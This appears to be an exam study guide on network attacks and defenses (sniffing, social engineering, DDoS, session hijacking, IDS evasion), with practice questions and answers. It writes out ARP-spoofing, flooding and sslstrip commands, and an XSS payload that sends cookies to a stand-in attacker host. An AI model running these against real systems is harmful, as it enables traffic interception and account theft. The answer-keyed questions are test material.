# Domain 4: Network and Perimeter Hacking

## Sub-Domain: Sniffing

---

## Sniffing Concepts

**Core Concept:** Sniffing captures network traffic. In a shared medium (hub) or via promiscuous mode, all frames are visible. In switched networks, traffic is isolated by MAC; attackers use ARP spoofing or MAC flooding to intercept. Sniffing targets passwords, email, and files.

**Key Tools:** Wireshark (`capture filter host 192.168.1.5`), tcpdump (`tcpdump -i eth0 host 10.0.0.1`), dsniff suite (arpspoof, dnsspoof), Cain & Abel.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Promiscuous mode accepts all frames; monitor mode is for wireless.
- Hub sends all traffic to all ports; switch unicasts.
- SPAN port allows lawful sniffing.
- Countermeasure: Encryption (HTTPS, SSH, VPN), static ARP, port security.

**Practice Question:**

On which type of network device can a sniffer capture all traffic simply by being plugged in, without any attack?
- A) Switch
- B) Hub
- C) Router
- D) Firewall

> **Answer: B** -- A hub repeats all traffic to every port.
---

## Sniffing Technique: MAC Attacks

**Core Concept:** MAC flooding overwhelms a switch's CAM table with fake source MAC addresses, causing it to fail open and flood all frames to all ports, converting it to a hub-like environment for sniffing.

**Key Tools:** `macof` (part of dsniff): `macof -i eth0 -s 192.168.1.100`, Yersinia, Etherflood.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- MAC flooding exploits the limited CAM table size.
- Countermeasure: Port security on Cisco switches: `switchport port-security maximum 1` and `switchport port-security violation shutdown`. Also, enable MAC address learning limits.

**Practice Question:**

An attacker runs macof on a switched network and subsequently captures traffic belonging to the victim's machine. What is the most likely explanation?
- A) The CAM table overflowed, causing the switch to flood frames
- B) The attacker changed his MAC to the victim's
- C) The switch is running STP
- D) The attacker performed a DHCP attack

> **Answer: A** -- MAC flooding overflows CAM table, switch enters fail-open mode broadcasting all frames.
---

## Sniffing Technique: DHCP Attacks

**Core Concept:** DHCP starvation exhausts IP pool by sending many DHCP requests with fake MACs, leading to denial of service. Then a rogue DHCP server (DHCP spoofing) can provide malicious DNS or gateway settings, directing traffic to the attacker for sniffing.

**Key Tools:** Yersinia (`yersinia -I interactive`), DHCPig (DHCP exhaustion), dnsmasq for rogue DHCP.

**Port Numbers & Protocols:** DHCP uses UDP 67/68.

**Common Pitfalls:**
- DHCP snooping requires trusted ports for legitimate DHCP servers.
- Countermeasure: Enable DHCP snooping, rate limit DHCP requests, use static IP for critical servers.

**Practice Question:**

An organization implements DHCP snooping on its switches. After configuration, clients can no longer obtain IP addresses from the legitimate server. What is the likely issue?
- A) DNS is down
- B) STP blocking
- C) MAC flooding is occurring
- D) The legitimate DHCP server port is not configured as trusted

> **Answer: D** -- DHCP snooping drops DHCP server messages unless port is trusted.
---

## Sniffing Technique: ARP Poisoning

**Core Concept:** ARP poisoning (spoofing) sends falsified ARP replies to associate the attacker's MAC with the IP of the gateway (or another host), causing traffic to be sent to the attacker, enabling sniffing or man-in-the-middle.

**Key Tools:**
- `arpspoof`: `arpspoof -i eth0 -t 192.168.1.5 192.168.1.1`
- Bettercap: `bettercap -T 192.168.1.5 --arp-spoof`
- Ettercap: `ettercap -T -M arp /target// /gateway//`

**Port Numbers & Protocols:** N/A (ARP is Layer 2)

**Common Pitfalls:**
- ARP poisoning works within the same broadcast domain.
- Countermeasure: Static ARP entries (not scalable), dynamic ARP inspection (DAI) on switches, ARPwatch to detect changes.
- DAI validates ARP packets against DHCP snooping binding table.

**Practice Question:**

A network admin sees a warning from ARPwatch that the MAC address for 192.168.1.1 changed from AA:BB:CC:11:22:33 to 00:0C:29:AB:CD:EF. What is the most likely attack?
- A) MAC flooding
- B) DNS poisoning
- C) DHCP starvation
- D) ARP poisoning

> **Answer: D** -- ARP cache poisoning changes the MAC associated with an IP.
---

## Sniffing Technique: Spoofing Attacks

**Core Concept:** Spoofing involves impersonating another device or user by falsifying data, such as MAC spoofing, IP spoofing, or content spoofing. Used to bypass filters, launch DoS, or perform MITM.

**Key Tools:**
- **MAC spoofing**: Linux `ifconfig eth0 hw ether 00:11:22:33:44:55`; Windows: SMAC tool
- **IP spoofing**: `hping3 -a spoofedIP target`

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- IP spoofing is used in blind attacks (attacker cannot see response).
- Countermeasure: Ingress/egress filtering at routers (RFC 2827) to drop packets with spoofed source IPs not belonging to internal network.

**Practice Question:**

A firewall rule blocks traffic from IP 10.0.0.50. An attacker changes his machine's IP to 10.0.0.51 and successfully connects. What type of attack is this?
- A) IP spoofing
- B) ARP spoofing
- C) DNS spoofing
- D) MAC spoofing

> **Answer: A** -- The attacker spoofs a different IP address.
---

## Sniffing Technique: DNS Poisoning

**Core Concept:** DNS poisoning corrupts the DNS cache of a resolver or host, redirecting a domain to a malicious IP. Attackers may exploit DNS protocol weaknesses (spoofed responses) or compromise a DNS server. Used for phishing or intercepting traffic.

**Key Tools:**
- `dnsspoof`: `dnsspoof -i eth0 -f hosts.txt`
- Bettercap: dns.spoof module
- Ettercap: DNS spoof plugin

**Port Numbers & Protocols:** DNS 53

**Common Pitfalls:**
- DNS uses UDP 53, connectionless, easier to spoof.
- DNSSEC provides authentication of responses.
- Countermeasure: Use DNSSEC, configure DNS servers to limit recursion, use random source ports, and transaction ID randomization.

**Practice Question:**

An attacker on a local network sends a crafted DNS reply to a victim that resolves www.google.com to 192.168.1.100. Which attack technique is this?
- A) DNS tunneling
- B) DNS amplification
- C) DNS cache poisoning
- D) DNS spoofing

> **Answer: D** -- The attacker directly spoofed a response.
---

## Sniffing Tools

**Core Concept:** Wireshark is the main GUI protocol analyzer. tcpdump is a CLI packet capture. Other tools: Bettercap (MITM), Cain & Abel (Windows sniffer and cracker), Ettercap, dsniff suite, and NetworkMiner (forensic).

**Key Tools:**
- **Wireshark**: `filter http.request.method == "POST"`
- **tcpdump**: `tcpdump -i eth0 port 80 -A` (ASCII)
- **Bettercap**: `net.sniff on`
- **NetworkMiner**: extracts files from pcap

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Cain & Abel is both a sniffer and password cracker.
- Wireshark display filters vs capture filters are different syntax.
- Countermeasure: Use encryption to render sniffed data useless.

**Practice Question:**

A security auditor wants to capture all HTTP traffic to a file for later analysis, with minimal CPU. Which command is best?
- A) `nmap -sS -p 80 target`
- B) `ping target`
- C) `tcpdump -i eth0 port 80 -w http.pcap`
- D) `netstat -an`

> **Answer: C** -- tcpdump captures and writes to file.
---

## Sniffing Countermeasures

**Core Concept:** Defend against sniffing by using encryption (SSL/TLS, SSH, VPN), switching infrastructure, port security, ARP spoofing detection (dynamic ARP inspection), and avoiding insecure protocols (FTP, Telnet, HTTP) for sensitive data.

**Key Tools:**
- DAI: `ip arp inspection vlan 10`
- Switchport security: `switchport port-security`
- Detection: XArp, ArpON
- VPN: OpenVPN, WireGuard

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Countermeasure against ARP poisoning is DAI.
- Against MAC flooding is port security.
- Against DHCP attacks is DHCP snooping.

**Practice Question:**

Which Cisco switch feature can prevent ARP spoofing by checking ARP packets against a trusted database?
- A) Port security
- B) DHCP snooping
- C) BPDU guard
- D) Dynamic ARP Inspection

> **Answer: D** -- DAI validates ARP packets using the DHCP snooping binding table.
---

## Sniffing Detection Techniques

**Core Concept:** Detect sniffing by monitoring for promiscuous mode interfaces (differentiating response to ARP requests, DNS tests), checking for reverse DNS lookups on sniffing machines, or using tools like Nmap with scripts.

**Key Tools:**
- **Nmap**: `nmap --script sniffer-detect <target>`
- NetScanTools Pro Promiscuous Mode Scanner
- AntiSniff

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Detection is not always reliable, as advanced sniffers can hide promiscuous mode.
- Running a sniffer on a switched network without ARP spoofing will capture only broadcast and traffic to that host.
- Countermeasure: Rely on prevention rather than detection.

**Practice Question:**

An administrator suspects a host is sniffing. She runs `nmap --script=sniffer-detect 10.0.0.5` and gets "Likely in promiscuous mode". What does this indicate?
- A) The host is a router
- B) The host is definitely a sniffer
- C) The host is compromised
- D) The host's NIC is likely accepting all frames, not just its own

> **Answer: D** -- The script tests if the NIC is in promiscuous mode.
---

## Sub-Domain: Social Engineering

---

## Social Engineering Concepts

**Core Concept:** Social engineering exploits human psychology to trick individuals into divulging information or performing actions. Attackers manipulate trust, fear, or urgency instead of breaking technical controls.

**Key Tools:** SET (Social-Engineer Toolkit): `setoolkit` then Social-Engineering Attacks. Phishing email templates.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The weakest link in security is the human element.
- Social engineering can be human-based (impersonation, tailgating) or computer-based (phishing).
- Phases of social engineering: research, developing trust, exploit.

**Countermeasures:** Security awareness training, strict verification policies, and simulated phishing tests.

**Practice Question:**

An attacker researches a target company's hierarchy, then calls an employee pretending to be the CEO demanding a password reset. Which phase is the attacker in when making the call?
- A) Development of trust
- B) Exploitation
- C) Research
- D) Exit

> **Answer: B** -- The call is the exploitation phase where the actual attack occurs.
---

## Social Engineering Techniques

**Core Concept:** Techniques include:
- **Phishing** -- mass email
- **Spear phishing** -- targeted, personalized
- **Whaling** -- targeting executives
- **Vishing** -- voice-based
- **Smishing** -- SMS-based
- **Baiting** -- offering something enticing (e.g., infected USB)
- **Quid pro quo** -- service for info
- **Tailgating** -- following someone into a restricted area
- **Shoulder surfing** -- watching someone enter credentials
- **Dumpster diving** -- searching trash

**Key Tools:** Phishing: Gophish, King Phisher. Baiting: infected USB drops.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Distinguish between phishing types: spear phishing is personalized, whaling targets high-level execs.
- Baiting uses physical media (USB).
- Tailgating requires physical proximity.

**Countermeasures:** Multi-factor authentication, anti-phishing filters, user training to recognize signs.

**Practice Question:**

An attacker leaves USB drives labeled "Salary Report 2024" in the company parking lot. Employees find them and plug them in. This technique is:
- A) Baiting
- B) Vishing
- C) Spear phishing
- D) Pretexting

> **Answer: A** -- Baiting uses physical media with enticing labels to exploit curiosity.
---

## Insider Threats

**Core Concept:** Insider threats come from employees, contractors, or partners with authorized access who intentionally or unintentionally cause harm. They have knowledge of internal systems, making detection harder.

**Key Tools:** Data exfiltration: USB drives, cloud storage, email. Misuse of legitimate access.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Insiders can be malicious (disgruntled) or negligent (accidental data exposure).
- Privileged insiders pose the highest risk.
- Indicators: abnormal access times, copying large data.

**Countermeasures:** Principle of least privilege, user behavior analytics (UBA), DLP, background checks, and separation of duties.

**Practice Question:**

A database administrator downloads the entire customer database to a personal cloud drive right after receiving a negative performance review. This is an example of:
- A) DDoS
- B) Malicious insider threat
- C) Accidental data loss
- D) Spear phishing

> **Answer: B** -- Authorized access used with malicious intent.
---

## Impersonation on Social Networking Sites

**Core Concept:** Attackers create fake profiles mimicking trusted individuals or organizations to connect with targets, gather information, or spread malware. They clone accounts and send friend requests to the victim's contacts.

**Key Tools:** Manual profile creation; tools to scrape data. Facebook account cloning. Maltego to map social networks.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Account cloning is duplicating a real profile with same name and photo, then sending requests to the victim's friends to build trust.

**Countermeasures:** Privacy settings to hide friend list, report fake profiles, educate users to verify requests through another channel.

**Practice Question:**

A user receives a friend request from a profile using the name and picture of an existing friend. The new profile asks about project details. What attack is this?
- A) Whaling
- B) Keylogging
- C) Social media account cloning
- D) DNS spoofing

> **Answer: C** -- Impersonating a known person on social media is account cloning.
---

## Identity Theft

**Core Concept:** Identity theft involves stealing personal information (SSN, bank details) to commit fraud. Attackers use phishing, dumpster diving, data breaches, and social media mining to collect PII.

**Key Tools:** Data breaches databases, dark web markets, credit monitoring services.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- **True name identity theft** -- using stolen identity to open new accounts
- **Account takeover** -- gaining access to existing accounts
- Methods like shoulder surfing for PINs.

**Countermeasures:** Shred documents, use strong unique passwords, enable MFA, monitor credit reports.

**Practice Question:**

A criminal uses a victim's name, SSN, and date of birth to obtain a credit card. This type of identity theft is known as:
- A) True name identity theft
- B) Account takeover
- C) Phishing
- D) Pretexting

> **Answer: A** -- Creating new accounts with the victim's real name.
---

## Social Engineering Countermeasures

**Core Concept:** The primary defense is security awareness training. Technical controls include email filtering, DLP, and access controls. Policies for verification, clean desk, and incident reporting.

**Key Tools:** KnowBe4 (training), PhishMe (simulation). Email filters: Mimecast, Proofpoint.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The most effective countermeasure is user education.
- Technology alone cannot stop all social engineering.
- A good security policy mandates verification of identity before disclosing sensitive information.

**Countermeasures:** Implement layered defenses: training, policies, technical filters, and physical security.

**Practice Question:**

Which is the single most effective way to reduce the risk of a successful social engineering attack?
- A) Deploy a firewall
- B) Conduct regular security awareness training
- C) Use strong encryption
- D) Install antivirus

> **Answer: B** -- Training users to recognize and respond to social engineering is key.
---

## Sub-Domain: Denial-of-Service

---

## DoS/DDoS Concepts

**Core Concept:** Denial of Service (DoS) attacks make a resource unavailable by overwhelming it with traffic or exploiting a vulnerability. DDoS uses multiple compromised systems (botnet) to amplify impact. Targets: bandwidth, system resources, application.

**Key Tools:** LOIC (low orbit ion cannon), HOIC, Slowloris. Botnets: Mirai.

**Port Numbers & Protocols:** Common targets: HTTP 80, DNS 53, NTP 123 for amplification.

**Common Pitfalls:**
- **Volumetric attacks** saturate bandwidth.
- **Protocol attacks** consume server state (SYN flood).
- **Application layer attacks** target web servers with low-and-slow requests (Slowloris).

**Countermeasures:** Rate limiting, intrusion prevention, anycast, CDN, blackhole routing, and DDoS mitigation services.

**Practice Question:**

An attacker sends thousands of TCP SYN packets with spoofed source IPs to a web server, never completing the handshake. What type of attack is this?
- A) HTTP flood
- B) Ping of Death
- C) SYN flood
- D) Smurf attack

> **Answer: C** -- SYN flood consumes connection table.
---

## Botnets

**Core Concept:** A botnet is a network of compromised computers (bots) controlled by a command and control (C2) server. Used for DDoS, spam, credential stuffing. Agents communicate via IRC, HTTP, or P2P.

**Key Tools:** C2 frameworks: Zeus, Mirai, Cobalt Strike. Detection: Wireshark to spot C2 traffic.

**Port Numbers & Protocols:** IRC 6667, HTTP 80/443.

**Common Pitfalls:**
- Bots can be organized in client-server or peer-to-peer. P2P botnets are harder to take down.
- Mirai botnet targets IoT devices.
- Bots are installed via trojans.

**Countermeasures:** Keep systems patched, antivirus, firewall egress filtering, block known C2 IPs, use IDS/IPS.

**Practice Question:**

Thousands of IP cameras with default passwords are exploited and start sending HTTP requests to a target website, causing downtime. This botnet likely resembles:
- A) WannaCry
- B) Stuxnet
- C) Zeus
- D) Mirai

> **Answer: D** -- Mirai specifically targets IoT devices with default credentials.
---

## DoS/DDoS Attack Techniques

**Core Concept:** Techniques include:
- **Volumetric**: UDP flood, ICMP flood
- **Amplification**: DNS, NTP, Memcached reflection
- **Protocol**: SYN flood, Ping of Death, Smurf
- **Application**: HTTP flood, Slowloris

Reflected attacks use spoofed source IP to bounce off servers.

**Key Tools:**
- `hping3 --flood -S -p 80 target`
- NTP amplification: abuse of monlist
- DNS amplification: query for ANY with spoofed IP

**Port Numbers & Protocols:** DNS 53, NTP 123, Memcached 11211.

**Common Pitfalls:**
- Smurf attack sends ICMP echo request with spoofed victim IP to broadcast address; all hosts reply flooding victim.
- Fraggle uses UDP.
- Ping of Death sends malformed oversized ICMP packet.
- Amplification factor is high for NTP (up to 556x).

**Countermeasures:** Disable unnecessary UDP services, implement ingress filtering (BCP38), rate limiting, anti-spoofing.

**Practice Question:**

An attacker sends ICMP echo requests to the network broadcast address of 10.0.0.0/24, spoofing the source IP of the victim. All hosts reply to the victim. This is a:
- A) Fraggle attack
- B) SYN flood
- C) DNS amplification
- D) Smurf attack

> **Answer: D** -- Smurf uses ICMP broadcast.
---

## DDoS Case Study

**Core Concept:** Famous DDoS attacks: 2016 Dyn DNS attack (Mirai botnet), 2018 GitHub memcached amplification (1.35 Tbps). Attackers exploited misconfigured Memcached servers with UDP amplification.

**Key Tools:** Mirai source code, Memcached `stats` command, DNS reflection.

**Port Numbers & Protocols:** Memcached 11211 UDP.

**Common Pitfalls:**
- The GitHub attack used memcached servers with spoofed requests, achieving massive amplification.

**Countermeasures:** Secure Memcached instances, bind to localhost, firewall UDP, and implement rate limiting.

**Practice Question:**

In 2018, a DDoS attack peaked at 1.35 Tbps by exploiting publicly accessible Memcached servers. What made the amplification factor so high?
- A) DNS zone transfer
- B) TCP three-way handshake
- C) Small request generated a huge response (up to 51,200x)
- D) ARP spoofing

> **Answer: C** -- Memcached amplification factor is enormous because a small UDP query returns large data.
---

## DoS/DDoS Attack Countermeasures

**Core Concept:** Defend with traffic monitoring, rate limiting, redundancy, load balancers, DDoS scrubbing services, and proper firewall rules. Block spoofed IPs at edge. Use SYN cookies to mitigate SYN flood.

**Key Tools:**
- Cloudflare, Akamai (DDoS protection)
- iptables: `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`
- Snort DDoS rules

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- SYN cookies is a defense against SYN flood: server does not allocate state until final ACK.
- Enable IP source guard to prevent spoofing.

**Countermeasures:** Implement a multi-layer defense: ISP level, perimeter firewall, application layer rate limiting, and scalable cloud resources.

**Practice Question:**

Which technique can protect a server from SYN flood attacks without dropping legitimate connections?
- A) Block all ICMP
- B) Close port 80
- C) Disable TCP
- D) SYN cookies

> **Answer: D** -- SYN cookies allow the server to handle legitimate connections while under attack.
---

## DoS/DDoS Protection Tools

**Core Concept:** Tools and services: Cloud-based scrubbing services (Cloudflare, Akamai, AWS Shield), on-premise appliances (F5, Arbor Networks), and network-level protections like blackhole routing.

**Key Tools:** Cloudflare's DDoS protection (reverse proxy). WAF with rate limiting. iptables with hashlimit.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Blackhole (sinkhole) drops all traffic to the target IP, including legitimate, but protects rest of network.
- Know the difference between on-premise and cloud-based protection.

**Countermeasures:** Use a hybrid approach: edge mitigation + application level controls.

**Practice Question:**

An organization wants to defend against volumetric DDoS attacks without investing in hardware. Which solution is best?
- A) Cloud-based DDoS scrubbing service
- B) Install antivirus
- C) Upgrade server CPU
- D) On-premise IPS

> **Answer: A** -- Cloud services can absorb large traffic volumes.
---

## Sub-Domain: Session Hijacking

---

## Session Hijacking Concepts

**Core Concept:** Session hijacking takes over an authenticated web session by stealing a valid session ID. Attackers can then impersonate the victim without credentials. Methods include session sniffing, XSS, predictable tokens, and MITM.

**Key Tools:** Wireshark (`filter http.cookie`), Burp Suite (Repeater to modify cookie), Ferret & Hamster (sidejacking), Bettercap.

**Port Numbers & Protocols:** HTTP/HTTPS

**Common Pitfalls:**
- Session ID should be unpredictable, long, and use HTTPS.
- **Session fixation** -- attacker forces known session ID onto victim
- **Session hijacking** -- stealing existing ID
- Countermeasure: Use HTTPS, regenerate session ID after login, set Secure and HttpOnly flags.

**Practice Question:**

An attacker sets up a rogue access point, and a victim connects and logs into an HTTP site. The attacker captures the session cookie and uses it to access the site. What type of attack?
- A) Session hijacking (sidejacking)
- B) SQL injection
- C) Cross-site request forgery
- D) Session fixation

> **Answer: A** -- Stealing and using a session cookie is session hijacking.
---

## Application-Level Session Hijacking

**Core Concept:** Targets web application session tokens. Methods include predicting session ID (if weak), stealing via XSS, man-in-the-browser, session fixation, or exploiting insecure direct object references. The attacker acts at the HTTP layer.

**Key Tools:**
- XSS payloads: `<script>new Image().src="http://attacker/cookie.php?c="+document.cookie</script>`
- Burp Suite: intercept and manipulate session cookies
- WebGoat for practice

**Port Numbers & Protocols:** HTTP/HTTPS

**Common Pitfalls:**
- Session fixation is prevented by changing session ID after login.
- HttpOnly cookie flag prevents JavaScript from reading the cookie.
- Secure flag ensures cookie sent only over HTTPS.
- Countermeasure: implement all cookie flags, use strong random session ID, re-authenticate for sensitive actions.

**Practice Question:**

A web application does not issue a new session ID after user authentication. An attacker logs in with a predetermined session ID and sends the same URL to a victim, who logs in. The attacker then uses that session ID. This is:
- A) Session sniffing
- B) Session donation
- C) Session fixation
- D) CSRF

> **Answer: C** -- The attacker fixed the session ID beforehand.
---

## Network-Level Session Hijacking

**Core Concept:** Intercepting and injecting packets into an existing TCP session between two hosts. Attacker must be able to spoof IP and predict TCP sequence numbers. Tools use ARP spoofing to insert themselves.

**Key Tools:** Hunt (Linux), Juggernaut, Bettercap, Hping3, Shijack tool.

**Port Numbers & Protocols:** TCP

**Common Pitfalls:**
- Network-level hijacking is more difficult now due to random sequence numbers.
- Blind hijacking is when the attacker cannot see responses.
- Countermeasure: Use encrypted protocols (SSH instead of Telnet), IPsec, and implement ingress filtering.

**Practice Question:**

An attacker uses a tool to inject a command into an existing Telnet session between a user and a server, without disrupting the connection. What technique is this?
- A) DNS poisoning
- B) ARP poisoning
- C) ICMP tunneling
- D) TCP session hijacking

> **Answer: D** -- Injecting into a live TCP session is session hijacking.
---

## Session Hijacking Tools

**Core Concept:** Application-level: Burp Suite, OWASP ZAP, Ferret/Hamster. Network-level: Hunt, Juggernaut, Bettercap. Browser extensions: Cookie Editor. Many MITM tools include session hijacking capabilities.

**Key Tools:**
- Bettercap: `set http.proxy.sslstrip true`, `http.proxy on`
- Ferret: `ferret -i eth0` (creates hamster.txt)
- Hamster: `hamster` then browser proxy to 127.0.0.1:3128
- Burp Suite: Proxy tab intercept

**Port Numbers & Protocols:** HTTP/HTTPS

**Common Pitfalls:**
- Hamster & Ferret are specifically sidejacking tools.
- They capture and replay session cookies.
- Countermeasure: Encrypt all traffic, enforce HSTS.

**Practice Question:**

A penetration tester uses a tool that captures HTTP cookies from a wireless network and then launches a browser-based proxy to reuse them. Which toolset?
- A) Nessus and Nikto
- B) Nmap and Wireshark
- C) John and Hashcat
- D) Ferret and Hamster

> **Answer: D** -- Ferret captures, Hamster replays session cookies.
---

## Session Hijacking Countermeasures

**Core Concept:** Use HTTPS for entire site, set cookies with Secure, HttpOnly, and SameSite attributes. Regenerate session ID after login and privilege changes. Implement logout function that invalidates session. Detect anomalies like IP change.

**Key Tools:**
- Web server: `Header always set Strict-Transport-Security "max-age=31536000"`
- PHP: `session_regenerate_id(true)`
- Network: use VPN, SSH tunneling for sensitive connections

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Regenerating session ID after login is critical.
- Logging out should destroy the session on server.
- Countermeasure for network-level hijacking: encryption and authentication (IPsec).

**Practice Question:**

Which cookie attribute prevents client-side JavaScript from accessing the session token?
- A) Secure
- B) SameSite
- C) HttpOnly
- D) Domain

> **Answer: C** -- HttpOnly restricts access from JavaScript, mitigating XSS-based cookie theft.
---

## Sub-Domain: Evading IDS, Firewalls, and Honeypots

---

## IDS, IPS, Firewall, and Honeypot Concepts

**Core Concept:** IDS (Intrusion Detection System) detects intrusions; IPS (Intrusion Prevention System) blocks them. Firewall filters traffic by rules. Honeypots are decoy systems to lure attackers and study techniques. IDS/IPS use signature-based, anomaly-based, and policy-based detection.

**Key Tools:** Snort (`snort -i eth0 -c snort.conf`), Suricata, Honeyd, KFSensor, iptables, pfSense.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- IDS is passive (detect and alert); IPS is inline (can block).
- Signature detection catches known patterns; anomaly detection flags deviations from baseline.
- Honeypot is a trap; honeynet is a network of honeypots.

**Countermeasures:** Use IDS/IPS in conjunction with firewall, keep signatures updated, tune to reduce false positives.

**Practice Question:**

A security device monitors traffic and sends an alert when a packet matches a known attack pattern. This device is operating as:
- A) IPS
- B) Router
- C) IDS
- D) Firewall

> **Answer: C** -- IDS alerts only; does not block.
---

## IDS, IPS, Firewall, and Honeypot Solutions

**Core Concept:** Commercial and open-source solutions. Snort (open-source IDS/IPS), Cisco Firepower, Palo Alto (NGFW). Honeypots: Honeyd (virtual hosts), Kippo (SSH), Dionaea (malware capture). Tarpit slows attackers.

**Key Tools:**
- Snort rules: `alert tcp any any -> any 80 (msg:"Attack"; content:"/etc/passwd";)`
- pfSense: firewall distro
- Honeyd: configuration file to mimic OS

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Snort can run in sniffer mode, packet logger, NIDS.
- Snort rules have action, protocol, source, destination.

**Countermeasures:** Deploy in-depth: use NGFW with integrated IPS, segment network, and use honeypots to divert attackers.

**Practice Question:**

Which open-source tool can be configured as both an IDS and IPS by using inline mode?
- A) Nmap
- B) Metasploit
- C) Snort
- D) Wireshark

> **Answer: C** -- Snort can be run inline (IPS) or passive (IDS).
---

## Evading IDS

**Core Concept:** Attackers bypass IDS by using encryption, fragmentation, evasion techniques (insertion, evasion), polymorphic shellcode, slow scanning, and exploiting IDS blind spots (false negatives).

**Key Tools:** Fragroute (fragmentation), Nmap `-f`, Metasploit payload encoding (`msfvenom -e x86/shikata_ga_nai`), Hping3 custom packets.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- **Insertion attack**: sending packets that IDS accepts but target rejects, causing IDS to see different traffic.
- **Evasion**: sending packets IDS rejects but target accepts.
- Fragmentation overlaps can cause different reassembly.
- Countermeasure: Use stream reassembly in IDS, normalize traffic.

**Practice Question:**

An attacker fragments the TCP header across multiple packets so that the IDS fails to reassemble and detect the attack string, while the target reassembles correctly. This is:
- A) ARP spoofing
- B) Session hijacking
- C) Insertion
- D) Evasion

> **Answer: D** -- Evasion when target accepts but IDS misses.
---

## Evading Firewalls

**Core Concept:** Firewalls can be bypassed by using allowed protocols (HTTP tunneling, SSH tunneling), source port manipulation, IP spoofing (if ingress not filtered), fragmenting packets, and using proxies.

**Key Tools:** Nmap `--source-port 53`, HTTPTunnel, Tor, VPNs, Proxychains (`proxychains nmap -sT target`).

**Port Numbers & Protocols:** HTTP 80, DNS 53 commonly allowed.

**Common Pitfalls:**
- Firewall might allow DNS (53) out; attacker sets source port to 53 to bypass egress rules.
- ICMP tunneling (ICMPTX) uses ICMP packets to carry data.
- Countermeasure: Deep packet inspection, egress filtering with stateful inspection.

**Practice Question:**

A network allows outbound DNS queries only. An attacker wants to exfiltrate data. He could use:
- A) DNS tunneling
- B) SYN flood
- C) ARP poisoning
- D) SQL injection

> **Answer: A** -- DNS tunneling hides data inside DNS queries, bypassing firewall rules.
---

## Evading NAC and Endpoint Security

**Core Concept:** Network Access Control (NAC) enforces endpoint compliance (patches, AV) before granting access. Attackers evade by spoofing MAC/IP of an authorized device, using a mobile device not subject to NAC, or exploiting weak authentication.

**Key Tools:** MAC spoofing, IP spoofing, packet crafting.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- NAC bypass techniques: using VoIP phone passthrough, hub to share port, MAC spoofing.
- Endpoint security evasion: disabling AV, using fileless malware, privilege escalation.

**Countermeasures:** 802.1X with certificate-based authentication, continuous monitoring.

**Practice Question:**

An attacker plugs a network hub between a trusted IP phone and the wall jack, then connects a laptop. The laptop is granted network access because it inherits the phone's authorization. This bypass technique exploits:
- A) VoIP phone passthrough/NAC bypass
- B) Weak MAC filtering
- C) ARP poisoning
- D) DNS spoofing

> **Answer: A** -- Some NAC implementations trust devices behind an IP phone; attacker piggybacks.
---

## IDS/Firewall Evading Tools

**Core Concept:** Tools to bypass detection: Nmap (fragmentation, decoy), Hping3 (custom packets), Metasploit payload encoders, veil-evasion, Shellter (code injection), and tunneling tools.

**Key Tools:**
- Veil-Evasion: generates payloads that bypass AV
- Shellter: dynamic shellcode injection
- Nmap: `--data-length`, `--mtu`
- Colusion (HTTP tunneling)
- ICMPTX (ICMP tunnel)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Veil is specifically designed to bypass antivirus by creating obfuscated payloads.
- Shellter uses PE injection.

**Countermeasures:** Use heuristic and behavioral AV, EDR, and restrict PowerShell and other tools.

**Practice Question:**

A penetration tester needs to generate a Windows reverse shell executable that will not be detected by most antivirus. Which tool is purpose-built for this?
- A) Wireshark
- B) Hydra
- C) Nessus
- D) Veil-Framework

> **Answer: D** -- Veil-Evasion is designed to create antivirus-evading payloads.
---

## Detecting Honeypots

**Core Concept:** Honeypots are traps; attackers detect them by analyzing responses for inconsistencies (e.g., no real traffic, too many open ports), using timing-based detection, or checking known honeypot signatures (e.g., MAC addresses of Honeyd).

**Key Tools:** Manual probing, Nmap (`-O` for OS, `-sV`), Netcat, Send-Safe Honeypot Hunter.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Honeyd simulates multiple OSes; its default MAC 00:00:0C:XX:XX:XX can be a tell.
- Extremely high uptime or all ports open is suspicious.

**Countermeasures:** Honeypot operators randomize responses and mix with real systems; use high-interaction honeypots.

**Practice Question:**

An attacker scans a system and finds ports 1-1000 all open with generic service banners and the MAC address starting with 00:00:0C. What is likely?
- A) A router
- B) A firewall
- C) A real server
- D) A honeypot, possibly Honeyd

> **Answer: D** -- Honeyd default MAC and too many open ports are indicators.
---

## IDS/Firewall Evasion Countermeasures

**Core Concept:** Defenses include stateful firewalls with deep packet inspection, IDS/IPS with updated signatures and anomaly detection, SSL inspection, ingress/egress filtering, NAC with 802.1X, and limiting unnecessary outbound protocols.

**Key Tools:** Snort with proper rules, pfSense with Squid proxy, Cisco ASA.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The best defense against evasion is a layered approach: not relying on a single security device.
- Implement strict egress filtering to block tunnels.

**Countermeasures:** Regular penetration testing to identify evasion paths.

**Practice Question:**

Which configuration best prevents attackers from using DNS tunneling for exfiltration?
- A) Use a DNS security solution that analyzes query content and limits query size
- B) Allow all outbound DNS
- C) Disable ICMP
- D) Block TCP port 53

> **Answer: A** -- Deep inspection of DNS traffic can detect anomalies and tunneling.